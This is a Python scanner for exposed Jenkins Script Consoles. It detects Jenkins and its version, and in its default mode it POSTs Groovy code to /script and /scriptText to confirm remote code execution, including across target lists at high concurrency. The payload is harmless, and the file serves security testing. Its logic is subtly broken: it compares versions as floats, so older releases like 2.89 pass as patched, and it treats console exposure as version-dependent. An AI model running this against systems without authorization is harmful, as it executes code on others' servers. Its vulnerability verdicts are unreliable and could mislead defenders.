#!/usr/bin/env python3
"""
Jenkins Script Console RCE Scanner
==================================

This script is a security scanner designed to identify and validate Remote Code Execution (RCE)
vulnerabilities in Jenkins instances with exposed or improperly secured Script Consoles.

Overview:
  - Jenkins provides a powerful Script Console that can execute Groovy code within its runtime.
  - If Jenkins and/or its Script Console is exposed without proper authentication or insufficiently secured,
    attackers can execute arbitrary code on the underlying server.

Key Features:
  - Safe fingerprinting to detect Jenkins and the presence of the Script Console.
  - Version detection for known insecure Jenkins configurations.
  - Safe mode (--safe) to perform detection-only scans.
  - Active probes for RCE validation, including execution of harmless commands.

Usage:
  - Scan a single instance:
      python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com:8080

  - Detection-only mode (no active probes):
      python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com:8080 --safe

  - Scan multiple instances from a file:
      python jenkins_script_console_rce_scanner.py --list targets.txt --output results.json

  - Increase concurrency for batch scanning:
      python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 50

Requirements:
  - Python 3.10+
  - `httpx` (install with `pip install httpx`)

References:
  - Jenkins Security Advisories: https://www.jenkins.io/security/advisory/
  - OWASP Jenkins RCE Overview: https://owasp.org/www-community/vulnerabilities/Jenkins_Script_Console_RCE

Disclaimer:
  Permission is required to scan systems for security vulnerabilities. Ensure you have proper authorization before using this tool.
"""

import asyncio
import httpx
import argparse
import json
import re
from datetime import datetime
from typing import List, Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME              = "jenkins_script_console_rce_scanner"
REQUEST_TIMEOUT        = 10
SEMAPHORE_LIMIT        = 20
DEFAULT_COMMAND        = 'println("Hello from Jenkins Scanner!")'

JENKINS_FINGERPRINTS   = [
    "X-Jenkins",
    "X-Hudson",
    "Jenkins-Crumb",
    "<title>Jenkins</title>",
    "/j_acegi_security_check"
]

SCRIPTCONSOLE_PATHS    = [
    "/script",
    "/scriptText"
]

VERSION_PATTERN = r'Jenkins ver\. (\d+\.\d+)'
KNOWN_VULNERABLE_VERSION = 2.150

# ── Functions ─────────────────────────────────────────────────────────────────

def is_version_vulnerable(version: str) -> bool:
    """Determine if the Jenkins version is possibly vulnerable."""
    try:
        version_number = float(version)
        return version_number < KNOWN_VULNERABLE_VERSION
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL with a timeout, ignoring SSL issues if --no-verify is set."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception as e:
        return None

async def detect_jenkins(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Identify if the target is running Jenkins, and extract its version."""
    for path in ["", "/login"]:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and response.status_code == 200:
            for fingerprint in JENKINS_FINGERPRINTS:
                if fingerprint.lower() in response.text.lower():
                    match = re.search(VERSION_PATTERN, response.text)
                    if match:
                        return match.group(1)
                    return "unknown"
    return None

async def probe_script_console(client: httpx.AsyncClient, target: str, safe: bool) -> bool:
    """Actively probe the Jenkins Script Console for RCE vulnerability."""
    for path in SCRIPTCONSOLE_PATHS:
        url = f"{target.rstrip('/')}{path}"
        if safe:
            response = await fetch_url(client, url)
            if response and response.status_code == 200:
                return True
        else:
            payload = {'script': DEFAULT_COMMAND}
            response = await client.post(url, data=payload, timeout=REQUEST_TIMEOUT)
            if response and "Hello from Jenkins Scanner!" in response.text:
                return True
    return False

async def scan_target(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """Scan a single target for Jenkins Script Console vulnerabilities."""
    result = {
        "target": target,
        "detected": False,
        "jenkins_version": None,
        "is_vulnerable": False,
        "rce_confirmed": False
    }

    print(f"[*] Scanning target: {target}")
    version = await detect_jenkins(client, target)
    if version:
        result["detected"] = True
        result["jenkins_version"] = version
        print(f"[{c(GREEN, 'INFO')}] Jenkins detected! Version: {version}")
        if is_version_vulnerable(version):
            result["is_vulnerable"] = True
            print(f"[{c(YELLOW, 'HIGH')}] Possibly vulnerable version detected: {version}")
            rce_test = await probe_script_console(client, target, safe)
            if rce_test:
                result["rce_confirmed"] = True
                print(f"[{c(RED, 'CRITICAL')}] CONFIRMED: Remote Code Execution is possible!")
            elif not safe:
                print(f"[{c(YELLOW, 'WARNING')}] RCE tests inconclusive or blocked!")
        else:
            print(f"[{c(GREEN, 'INFO')}] Jenkins version is patched or not vulnerable.")
    else:
        print(f"[{c(RED, 'ERROR')}] Jenkins not detected at target.")

    return result

async def main(args):
    """Main entry point for the scanner."""
    results = []
    targets = []

    # Load targets from --list or --target
    if args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.target:
        targets = [args.target]

    if not targets:
        print(f"[{c(RED, 'ERROR')}] No targets provided. Use --target or --list.")
        return

    # Setup HTTP client with optional SSL no-verify
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        semaphore = asyncio.Semaphore(args.concurrency)

        async def bounded_scan(target):
            async with semaphore:
                res = await scan_target(client, target, args.safe)
                results.append(res)

        tasks = [bounded_scan(target) for target in targets]
        await asyncio.gather(*tasks)

    # Output results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[{c(GREEN, 'INFO')}] Results saved to {args.output}")
    else:
        for result in results:
            print(json.dumps(result, indent=2))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jenkins Script Console RCE Scanner")
    parser.add_argument("--target", help="Target URL (e.g., http://jenkins.example.com:8080)")
    parser.add_argument("--list", help="File containing a list of target URLs to scan.")
    parser.add_argument("--output", help="Output file for JSON results.")
    parser.add_argument("--safe", action="store_true", help="Enable detection-only mode (disable active RCE probes).")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max number of concurrent requests (default: 20).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification.")
    args = parser.parse_args()

    asyncio.run(main(args))
